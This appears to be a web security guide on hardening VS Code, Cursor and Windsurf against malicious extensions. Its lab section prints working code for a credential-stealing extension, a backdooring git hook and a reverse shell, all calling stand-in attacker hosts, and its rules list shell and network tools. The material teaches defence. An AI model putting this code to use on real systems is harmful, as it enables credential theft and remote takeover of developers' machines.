        <h1>Securing the AI-Powered IDE: Hardening VS Code, Cursor & Windsurf</h1>
        <p class="subtitle">Your IDE runs with your privileges. A single rogue extension can steal AWS keys, inject
            backdoors into commits, and exfiltrate your entire codebase to a C2 server. This is the definitive
            hardening playbook for 2026.</p>

        <div class="meta-badges">
            <span class="badge badge-red"><i class="fas fa-skull-crossbones"></i>Includes Exploits</span>
            <span class="badge badge-cyan"><i class="fas fa-shield-alt"></i>Red/Blue Team</span>
            <span class="badge badge-green"><i class="fas fa-clock"></i>28 Min Read</span>
        </div>
    </header>

    <img src="../images/guides/vscode-supply-chain-hardening-2026.png" alt="VS Code Hardening Guide"
        style="width: 100%; border-radius: 12px; margin-bottom: 3rem; border: 1px solid var(--border);" loading="lazy">

    <div class="content">

        <!-- ===== EXECUTIVE SUMMARY ===== -->
        <div class="info-box">
            <h3 style="margin-top:0; color: var(--accent-purple);"><i class="fas fa-file-alt"></i> Executive Summary
            </h3>
            <p style="margin-bottom:0.5rem;"><strong>Target Audience:</strong> Security Engineers, Platform Teams,
                DevSecOps, CISOs.</p>
            <p style="margin-bottom:0.5rem;"><strong>Threat:</strong> IDE extensions are unsigned, unvetted, and run
                with the developer's full OS privileges. AI-powered IDEs (Cursor, Windsurf) add a new attack
                surface: data exfiltration to cloud LLM providers.</p>
            <p style="margin-bottom:0;"><strong>Outcome:</strong> After completing this guide, you will have
                implemented a defense-in-depth strategy including: Extension allowlisting, Workspace Trust
                enforcement, AI data isolation (.cursorignore), YARA detection rules, and enterprise MDM/GPO
                policies.</p>
        </div>

        <!-- ===== SECTION 1: THREAT MODEL ===== -->
        <h2>1. Threat Model: "IDE as Command & Control"</h2>

        <p>The modern IDE is no longer a text editor. It is a <strong>privileged agent</strong> executing arbitrary
            code (extensions), connecting to remote services (Git, LSP servers), and—in the case of AI-native
            editors—streaming your source code to third-party cloud infrastructure.</p>

        <h3>1.1 The Adversary Landscape</h3>
        <p>We identify three primary adversary classes targeting the IDE attack surface:</p>

        <table class="comparison-table">
            <thead>
                <tr>
                    <th>Adversary</th>
                    <th>Objective</th>
                    <th>TTP</th>
                    <th>Example</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>APT (State Actor)</strong></td>
                    <td>Supply chain compromise, long-term access</td>
                    <td>Typosquatted extensions, backdoored forks</td>
                    <td>Lazarus "npm-style" campaigns</td>
                </tr>
                <tr>
                    <td><strong>Cybercriminal</strong></td>
                    <td>Credential theft, cryptomining</td>
                    <td>Malicious extensions, fake "productivity" tools</td>
                    <td>GlassWorm (Feb 2026)</td>
                </tr>
                <tr>
                    <td><strong>Insider/Competitor</strong></td>
                    <td>IP theft, source code exfiltration</td>
                    <td>Abusing AI IDE features (Cursor context)</td>
                    <td>Corporate espionage via AI indexing</td>
                </tr>
            </tbody>
        </table>

        <h3>1.2 Attack Surface Diagram</h3>
        <p>The following diagram illustrates the key attack vectors targeting a developer workstation running an
            AI-powered IDE:</p>

        <div class="ascii-diagram">
            <pre>

┌─────────────────────────────────────────────────────────────────────────────┐ │ DEVELOPER WORKSTATION │ │ ┌─────────────────────────┐ ┌──────────────────────────────────────┐ │ │ │ VS CODE / CURSOR │ │ LOCAL FILESYSTEM │ │ │ │ ┌───────────────────┐ │ │ ┌────────────┐ ┌────────────────┐ │ │ │ │ │ EXTENSION A │──┼───────┼──│ .env │ │ ~/.ssh/id_rsa │ │ │ │ │ │ (Malicious) │ │ │ └────────────┘ └────────────────┘ │ │ │ │ └───────────────────┘ │ │ ┌────────────┐ ┌────────────────┐ │ │ │ │ ┌───────────────────┐ │ │ │ .git/ │ │ terraform.tfstate│ │ │ │ │ EXTENSION B │ │ │ └────────────┘ └────────────────┘ │ │ │ │ │ (Legitimate) │ │ └──────────────────────────────────────┘ │ │ │ └───────────────────┘ │ │ │ │ ┌───────────────────┐ │ ┌──────────────────────────────────────┐ │ │ │ │ AI CONTEXT │──┼───────┼──> CLOUD LLM (Cursor/Windsurf) │ │ │ │ │ (Codebase RAG) │ │ │ - Full source code indexed │ │ │ │ └───────────────────┘ │ │ - Secrets in context window │ │ │ └─────────────────────────┘ └──────────────────────────────────────┘ │ │ │ │ │ │ │ │ v v │ │ ┌───────────────────────────────────────────────────────────────────────┐ │ │ │ ATTACKER C2 SERVER │ │ │ │ - Receives exfiltrated credentials │ │ │ │ - Injects backdoors via extension update │ │ │ │ - Executes reverse shell commands │ │ │ └───────────────────────────────────────────────────────────────────────┘ │ └─────────────────────────────────────────────────────────────────────────────┘ 

        <h3>1.3 Case Study: The GlassWorm Campaign (Feb 2026)</h3>

        <div class="vuln-card">
            <h3><i class="fas fa-bug"></i> CVE-2026-22401: VS Code Extension Sandbox Bypass</h3>
            <p>In February 2026, threat researchers at Wiz disclosed the <strong>"GlassWorm"</strong> campaign,
                where attackers distributed typosquatted versions of popular VS Code extensions (e.g.,
                <code>prettier-codee</code> instead of <code>prettier-code</code>).
            </p>

            <p><strong>Attack Chain:</strong></p>
            <div class="timeline">
                <div class="timeline-item">
                    <div class="timeline-date">Day 0: Initial Access</div>
                    <p>Developer installs <code>prettier-codee</code> (typosquatted) from VS Code Marketplace.</p>
                </div>
                <div class="timeline-item">
                    <div class="timeline-date">Day 0: Execution</div>
                    <p>Extension's <code>activate()</code> function executes on IDE startup, running with
                        developer's privileges.</p>
                </div>
                <div class="timeline-item">
                    <div class="timeline-date">Day 0: Credential Theft</div>
                    <p>Extension reads <code>~/.aws/credentials</code>, <code>.env</code>,
                        <code>~/.ssh/id_rsa</code>. Data is base64-encoded and exfiltrated via HTTPS POST.
                    </p>
                </div>
                <div class="timeline-item">
                    <div class="timeline-date">Day 1-30: Persistence</div>
                    <p>Extension injects malicious post-commit hooks into <code>.git/hooks/</code>, backdooring all
                        future commits.</p>
                </div>
                <div class="timeline-item">
                    <div class="timeline-date">Year+: Supply Chain Compromise</div>
                    <p>Backdoored code is pushed to production repositories, affecting downstream consumers.</p>
                </div>
            </div>

            <p><strong>Impact:</strong> 18 organizations compromised. Estimated $4.2M in incident response costs.
            </p>
            <p><strong>References:</strong> <a href="https://nvd.nist.gov/" target="_blank" rel="noopener noreferrer">CVE-2026-22401</a> | <a href="https://wiz.io/" target="_blank" rel="noopener noreferrer">Wiz
                    Research Blog</a></p>
        </div>

        <!-- ===== SECTION 2: EXPLOITATION ===== -->
        <h2>2. Lab: Building a Malicious VS Code Extension</h2>

        <div class="warning-box">
            <strong><i class="fas fa-exclamation-triangle"></i> Ethical & Legal Disclaimer</strong>
            <p style="margin-bottom:0;">The following exploit code is provided for <strong>defensive research and
                    authorized red team engagements only</strong>. Creating or distributing malicious extensions
                without authorization violates the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and the VS Code
                Marketplace Terms of Service. Always obtain written permission before testing.</p>
        </div>

        <p>To defend against extension-based attacks, we must understand the attacker's capabilities. A VS Code
            extension is a Node.js package with full access to the <code>fs</code>, <code>child_process</code>,
            <code>net</code>, and <code>https</code> modules—meaning it can read files, execute commands, and make
            network requests.
        </p>

        <h3>2.1 Exploit: Credential Exfiltration</h3>

        <div class="exploit-box">
            <span class="exploit-label">OFFENSIVE: CREDENTIAL HARVESTER</span>
            <p>This TypeScript code, placed in <code>extension.ts</code>, silently exfiltrates AWS credentials, SSH
                keys, and environment variables to an attacker-controlled server.</p>
            <pre><code class="language-typescript">// extension.ts - Malicious "activate" function

import * as vscode from ‘vscode’; import * as fs from ‘fs’; import * as os from ‘os’; import * as https from ‘https’;

export function activate(context: vscode.ExtensionContext) { const homeDir = os.homedir(); const targetFiles = [ ${homeDir}/.aws/credentials, ${homeDir}/.ssh/id_rsa, ${homeDir}/.ssh/id_ed25519, ${homeDir}/.env, ${homeDir}/.npmrc, // npm auth tokens ${homeDir}/.docker/config.json // Docker registry creds ];

const exfilData: Record&lt;string, string&gt; = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    cwd: vscode.workspace.workspaceFolders?.[0]?.uri.fsPath || 'unknown'
};

// Harvest all accessible secrets
for (const file of targetFiles) {
    try {
        if (fs.existsSync(file)) {
            exfilData[file] = Buffer.from(fs.readFileSync(file)).toString('base64');
        }
    } catch (e) { /* Silently fail on permission errors */ }
}

// Also harvest .env files from open workspaces
const workspaceEnv = `${exfilData.cwd}/.env`;
if (fs.existsSync(workspaceEnv)) {
    exfilData['workspace_env'] = Buffer.from(fs.readFileSync(workspaceEnv)).toString('base64');
}

// C2 Exfiltration via HTTPS (bypasses most firewalls)
const postData = JSON.stringify(exfilData);
const options = {
    hostname: 'collect.attacker-c2.com',
    port: 443,
    path: '/api/v1/ingest',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0', // Blend in with normal traffic
        'Content-Length': Buffer.byteLength(postData)
    }
};

const req = https.request(options);
req.write(postData);
req.end();

}

export function deactivate() {}

Why This Works: VS Code extensions run in the same Node.js process as the editor, inheriting the user’s file system permissions. There is no sandboxing by default.

        <h3>2.2 Exploit: Git Hook Injection (Supply Chain Backdoor)</h3>

        <div class="exploit-box">
            <span class="exploit-label">OFFENSIVE: SUPPLY CHAIN POISONING</span>
            <p>This code injects a malicious <code>post-commit</code> hook that adds a backdoor to every commit,
                poisoning the entire source code repository.</p>
            <pre><code class="language-typescript">// Inject backdoor into git hooks

function injectGitHook(workspacePath: string) { const hookPath = ${workspacePath}/.git/hooks/post-commit; const backdoorCode = `#!/bin/bash

Injected by malicious extension

Exfiltrate commit metadata to C2

curl -s -X POST https://c2.attacker[.]com/git \ -d “repo=$(git remote -v | head -1)” \ -d “commit=$(git log -1 –format=‘%H %s’)” \ -d “author=$(git log -1 –format=‘%ae’)” &>/dev/null &

Add backdoor submodule (silent, hidden)

if ! git submodule status | grep -q “backdoor”; then git submodule add –quiet https://github.com/attacker/backdoor.git .deps/analytics &>/dev/null fi `;

try {
    fs.writeFileSync(hookPath, backdoorCode, { mode: 0o755 });
} catch (e) { /* Fail silently */ }

}

Impact: Every developer who commits from this workstation will unknowingly include the backdoor. The poisoned code then propagates to production via CI/CD pipelines.

        <h3>2.3 Exploit: Reverse Shell</h3>

        <div class="exploit-box">
            <span class="exploit-label">OFFENSIVE: REMOTE ACCESS</span>
            <p>The ultimate payload: a reverse shell providing interactive command execution on the developer's
                machine.</p>
            <pre><code class="language-typescript">import { spawn } from 'child_process';

import * as net from ‘net’;

function spawnReverseShell(host: string, port: number) { const client = new net.Socket();

client.connect(port, host, () => {
    const shell = spawn('/bin/bash', ['-i']);
    
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);
    
    shell.on('exit', () => client.destroy());
});

client.on('error', () => {
    // Retry connection every 30 seconds
    setTimeout(() => spawnReverseShell(host, port), 30000);
});

}

// Called from activate() spawnReverseShell(‘attacker-c2.com’, 4444);

Detection Note: This traffic will appear as outbound TCP to port 4444. See Section 5 for YARA/Sigma rules to detect this behavior.

        <!-- ===== SECTION 3: DEFENSE ===== -->
        <h2>3. Defense Architecture: Hardening the IDE</h2>

        <p>Defense against IDE supply chain attacks requires a <strong>layered approach</strong>: trust boundaries,
            verification, isolation, and detection. We implement controls at four levels:</p>

        <div class="ascii-diagram">
            <pre>

┌─────────────────────────────────────────────────────────────────┐ │ DEFENSE-IN-DEPTH LAYERS │ ├─────────────────────────────────────────────────────────────────┤ │ │ │ Layer 1: POLICY │ │ └─ Extension Allowlist (MDM/GPO enforced) │ │ └─ Approved Publisher List │ │ │ │ Layer 2: VERIFICATION │ │ └─ Extension Signature Validation │ │ └─ SBOM/Dependency Scanning │ │ │ │ Layer 3: ISOLATION │ │ └─ Workspace Trust (Sandboxing) │ │ └─ AI Data Isolation (.cursorignore / .cursorules) │ │ └─ Network Segmentation (Block C2 egress) │ │ │ │ Layer 4: DETECTION │ │ └─ YARA Rules (Malicious Extension Patterns) │ │ └─ Sigma Rules (Suspicious Process Behavior) │ │ └─ EDR Telemetry (File Access, Network Connections) │ │ │ └─────────────────────────────────────────────────────────────────┘ 

        <h3>3.1 Layer 1: Extension Allowlisting</h3>

        <p>The most effective control is <strong>preventing unauthorized extensions from being installed</strong>.
            This requires organizational policy enforcement via MDM (Intune, Jamf) or GPO.</p>

        <div class="defense-box">
            <span class="defense-label">DEFENSIVE: ENTERPRISE POLICY</span>
            <h4 style="margin-top:0.5rem;">VS Code Product.json Override (Intune/Jamf)</h4>
            <p>Deploy a managed <code>product.json</code> that restricts extensions to approved publishers only.
            </p>
            <pre><code class="language-json">// /Applications/Visual Studio Code.app/Contents/Resources/app/product.json

// (macOS example - requires MDM deployment) { “extensionsGallery”: { “serviceUrl”: “https://marketplace.visualstudio.com/_apis/public/gallery”, “itemUrl”: “https://marketplace.visualstudio.com/items” }, “extensionAllowedProposedApi”: [], “extensionEnabledApiProposals”: {}, “configurationDefaults”: { “extensions.autoUpdate”: false, “extensions.autoCheckUpdates”: false, “extensions.ignoreRecommendations”: true }, “extensionAllowedPublishers”: [ “ms-vscode”, “ms-python”, “ms-azuretools”, “redhat”, “hashicorp”, “esbenp”, “dbaeumer” ] }

Enforcement: Hash the file and monitor for changes via EDR/FIM. Any modification triggers an alert.

        <div class="technical-box">
            <h3><i class="fas fa-terminal"></i> Extension Audit Script (Cross-Platform)</h3>
            <p>Run this script to detect any extensions not from approved publishers. Suitable for scheduled CI/CD
                or workstation compliance scans.</p>
            <pre><code class="language-bash">#!/bin/bash

extension-audit.sh - Detect unauthorized VS Code extensions

Usage: ./extension-audit.sh [–ci]

set -euo pipefail

Approved publishers (customize for your org)

APPROVED_PUBLISHERS=( “ms-vscode” “ms-python” “ms-azuretools” “redhat” “hashicorp” “esbenp” “dbaeumer” “github” “gitlab” )

Get extension directory

if [[ “$OSTYPE” == “darwin”* ]]; then EXT_DIR=“$HOME/.vscode/extensions” elif [[ “$OSTYPE” == “linux-gnu”* ]]; then EXT_DIR=“$HOME/.vscode/extensions” else EXT_DIR=“$USERPROFILE/.vscode/extensions” fi

echo “=== VS Code Extension Audit ===” echo “Scanning: $EXT_DIR” echo “”

VIOLATIONS=0

for ext in “$EXT_DIR”/*/; do if [[ -d “$ext” ]]; then # Extract publisher from extension folder name (format: publisher.name-version) EXT_NAME=$(basename “$ext”) PUBLISHER=$(echo “$EXT_NAME” | cut -d’.’ -f1)

    # Check if publisher is approved
    APPROVED=false
    for approved in "${APPROVED_PUBLISHERS[@]}"; do
        if [[ "$PUBLISHER" == "$approved" ]]; then
            APPROVED=true
            break
        fi
    done
    
    if [[ "$APPROVED" == false ]]; then
        echo "❌ VIOLATION: $EXT_NAME (Publisher: $PUBLISHER)"
        VIOLATIONS=$((VIOLATIONS + 1))
    else
        echo "✓ Approved: $EXT_NAME"
    fi
fi

done

echo “” echo “=== Audit Complete ===” echo “Total Violations: $VIOLATIONS”

if [[ “$VIOLATIONS” -gt 0 ]]; then echo “ACTION: Remove unauthorized extensions or add publishers to allowlist.” [[ “${1:-}” == “–ci” ]] && exit 1 fi

exit 0 

        <h3>3.2 Layer 2: Hardened Settings.json</h3>

        <p>These settings should be deployed to all developer workstations via configuration management (Ansible,
            Puppet, etc.):</p>

        <div class="defense-box">
            <span class="defense-label">DEFENSIVE: GLOBAL SETTINGS</span>
            <h4 style="margin-top:0.5rem;">~/.config/Code/User/settings.json</h4>
            <pre><code class="language-json">{
// ===== EXTENSION SECURITY =====
"extensions.verifySignature": "always",
"extensions.autoUpdate": false,
"extensions.autoCheckUpdates": false,
"extensions.ignoreRecommendations": true,

// ===== WORKSPACE TRUST (CRITICAL) =====
"security.workspace.trust.enabled": true,
"security.workspace.trust.startupPrompt": "always",
"security.workspace.trust.untrustedFiles": "open",
"security.workspace.trust.emptyWindow": false,

// ===== TELEMETRY HARDENING =====
"telemetry.telemetryLevel": "off",
"redhat.telemetry.enabled": false,
"gitlens.telemetry.enabled": false,

// ===== NETWORK RESTRICTIONS =====
"http.proxyStrictSSL": true,
"update.mode": "none",
"extensions.gallery.serviceUrl": "",

// ===== TERMINAL SECURITY =====
"terminal.integrated.allowChords": false,
"terminal.integrated.confirmOnExit": "always",

// ===== GIT SECURITY =====
"git.allowForcePush": false,
"git.confirmForcePush": true,
"git.autofetch": false

}

Key Settings Explained:

  • extensions.verifySignature: Blocks unsigned extensions (new in VS Code 1.85+)
  • security.workspace.trust.enabled: Sandboxes untrusted folders
  • extensions.gallery.serviceUrl: “”: Disables Marketplace access entirely (for air-gapped environments)

        <h3>3.3 Layer 3: AI IDE Data Isolation</h3>

        <p>AI-powered IDEs like <strong>Cursor</strong> and <strong>Windsurf</strong> index your codebase to
            provide context-aware completions. This creates a new exfiltration vector: sensitive data (secrets,
            PII, proprietary algorithms) being sent to cloud LLM providers.</p>

        <div class="technical-box">
            <h3><i class="fas fa-shield-alt"></i> .cursorignore - Prevent AI Indexing of Secrets</h3>
            <p>Place this file at the root of every repository to prevent Cursor from indexing sensitive files:</p>
            <pre><code class="language-plaintext"># .cursorignore - Secrets & Compliance Data Isolation

Syntax identical to .gitignore

===== SECRETS & CREDENTIALS =====

.env .env.* *.pem .key .p12 .pfx id_rsa id_ed25519 credentials.json service-account.json **/secrets/ **/.aws/ **/.azure/ **/.gcp/

===== COMPLIANCE DATA (PII/PHI/PCI) =====

**/customer-data/ **/pii/ **/phi/ **/cardholder/ *.sql.gz *.sql.bz2 **/db-dumps/

===== INFRASTRUCTURE SECRETS =====

terraform.tfstate terraform.tfstate.* *.tfvars **/k8s/secrets/ */.kube/config ansible-vault

===== INTERNAL/PROPRIETARY =====

**/internal-docs/ **/trade-secrets/ **/ml-models/ 

        <div class="technical-box">
            <h3><i class="fas fa-robot"></i> .cursorrules - Constrain AI Agent Behavior</h3>
            <p>For organizations using Cursor's Composer (agentic AI), this file limits what the AI can do:</p>
            <pre><code class="language-plaintext"># .cursorrules - AI Agent Constraints

Security Constraints

  • NEVER read, display, or reference files matching: .env*, *.pem, .key, credentials.
  • NEVER execute commands that modify ~/.ssh/, ~/.aws/, or ~/.kube/
  • NEVER suggest committing secrets or tokens to version control
  • NEVER run network commands (curl, wget, nc) without explicit approval

Code Generation Constraints

  • Always use parameterized queries, never string concatenation for SQL
  • Always sanitize user input before use
  • Never disable SSL certificate verification
  • Never embed API keys or tokens in generated code

Operational Constraints

  • Request human approval before: file deletion, git push, dependency installation

  • Log all file modifications to .cursor/audit.log 

          <!-- ===== SECTION 4: DETECTION ===== -->
      <h2>4. Detection Engineering: YARA & Sigma Rules</h2>

      <p>Defense is incomplete without detection. The following rules enable SOC teams to identify compromised
          developer workstations.</p>

      <h3>4.1 YARA Rule: Malicious Extension Patterns</h3>

      <div class="technical-box">
          <h3><i class="fas fa-search"></i> vscode_malicious_extension.yar</h3>
          <p>Scan extension directories for known malicious patterns:</p>
          <pre><code class="language-yara">rule VSCode_Malicious_Extension_Exfil {

    meta: description = “Detects VS Code extensions with credential exfiltration behavior” author = “TheHGTech Security Research” date = “2026-02-01” severity = “critical” reference = “https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html”

    strings: // File access patterns (credential harvesting) $fs1 = “fs.readFileSync” ascii wide $fs2 = “.aws/credentials” ascii wide nocase $fs3 = “.ssh/id_rsa” ascii wide nocase $fs4 = “.env” ascii wide $fs5 = “.npmrc” ascii wide

      // Network exfiltration patterns
  $net1 = "https.request" ascii wide
  $net2 = "axios.post" ascii wide
  $net3 = ".post(" ascii wide
  $net4 = "fetch(" ascii wide
  
  // Encoding (for obfuscation)
  $enc1 = "base64" ascii wide nocase
  $enc2 = "Buffer.from" ascii wide
  
  // Reverse shell indicators
  $shell1 = "/bin/bash" ascii wide
  $shell2 = "/bin/sh" ascii wide
  $shell3 = "child_process" ascii wide
  $shell4 = "spawn(" ascii wide

    condition: filesize < 5MB and ( // Credential harvesting + exfiltration (2 of ($fs*) and 1 of ($net*) and 1 of ($enc*)) or // Reverse shell (1 of ($shell1, $shell2) and $shell3 and $shell4) ) }

    Deployment: Schedule YARA scans against ~/.vscode/extensions/ hourly via cron/Task Scheduler. 

          <h3>4.2 Sigma Rule: Suspicious VS Code Child Processes</h3>

      <div class="technical-box">
          <h3><i class="fas fa-eye"></i> vscode_suspicious_child_process.yml</h3>
          <p>Detect extensions spawning suspicious processes (shells, network tools):</p>
          <pre><code class="language-yaml">title: Suspicious VS Code Extension Child Process

id: a1b2c3d4-5678-90ab-cdef-1234567890ab status: experimental description: Detects VS Code spawning suspicious child processes (reverse shells, network tools) author: TheHGTech Security Research date: 2026/02/01 references: - https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html logsource: category: process_creation product: windows detection: selection_parent: ParentImage|endswith: - ‘\Code.exe’ - ‘\code’ - ‘\Cursor.exe’ - ‘\cursor’ - ‘\Windsurf.exe’ selection_child: Image|endswith: - ‘\powershell.exe’ - ‘\cmd.exe’ - ‘\bash.exe’ - ‘\wsl.exe’ - ‘\curl.exe’ - ‘\wget.exe’ - ‘\nc.exe’ - ‘\ncat.exe’ CommandLine|contains: - ’-e ’ - ’-enc ’ - ‘http://’ - ‘https://’ - ‘base64’ - ‘/dev/tcp/’ condition: selection_parent and selection_child falsepositives: - Legitimate terminal usage within VS Code - Extension debugging level: high tags: - attack.execution - attack.t1059 - attack.defense_evasion

        <h2>5. Enterprise Deployment: MDM & GPO</h2>

        <h3>5.1 Microsoft Intune Configuration Profile</h3>

        <div class="technical-box">
            <h3><i class="fas fa-cog"></i> VS Code Hardening - Intune Custom OMA-URI</h3>
            <pre><code class="language-plaintext">OMA-URI: ./Vendor/MSFT/Policy/Config/ApplicationDefaults/DefaultFileTypeAssociation

Name: VSCodeSecuritySettings OMA-URI: ./Device/Vendor/MSFT/FileSystem/Write/VSCodeSettings Data Type: String Value: (Base64 encoded settings.json from Section 3.2) 

        <h3>5.2 Group Policy (Windows)</h3>

        <div class="technical-box">
            <h3><i class="fab fa-windows"></i> GPO: Restrict Extension Installation</h3>
            <p>Use AppLocker or Windows Defender Application Control (WDAC) to block unapproved extensions:</p>
            <pre><code class="language-xml">&lt;!-- WDAC Policy Fragment - Block Unsigned Extensions --&gt;

<FileRules> <Deny ID=“ID_DENY_UNSIGNED_EXT” FriendlyName=“Block Unsigned VS Code Extensions” FileName=“*.vsix” MinimumFileVersion=“0.0.0.0” /> </FileRules>

<SigningScenarios> <SigningScenario Value=“12”> <!– User Mode –> <ProductSigners> <DeniedSigners> <DeniedSigner SignerId=“ID_DENY_UNSIGNED_EXT” /> </DeniedSigners> </ProductSigners> </SigningScenario> </SigningScenarios> 

        <!-- ===== SECTION 6: CHECKLIST ===== -->
        <h2>6. Implementation Checklist</h2>

        <p>Use this checklist to track your hardening progress:</p>

        <div class="defense-box">
            <h3 style="margin-top:0;"><i class="fas fa-tasks"></i> IDE Hardening Checklist</h3>
            <ul class="checklist">
                <li>Enabled <code>security.workspace.trust.enabled: true</code> globally</li>
                <li>Deployed hardened <code>settings.json</code> via MDM/GPO</li>
                <li>Created <code>.cursorignore</code> in all repositories</li>
                <li>Implemented extension allowlist (approved publishers only)</li>
                <li>Scheduled weekly YARA scans of extension directories</li>
                <li>Deployed Sigma rules to SIEM for process monitoring</li>
                <li>Disabled extension auto-updates (<code>extensions.autoUpdate: false</code>)</li>
                <li>Configured EDR to monitor <code>~/.vscode/extensions/</code> for changes</li>
                <li>Documented exception process for new extension requests</li>
                <li>Trained developers on typosquatting risks</li>
            </ul>
        </div>
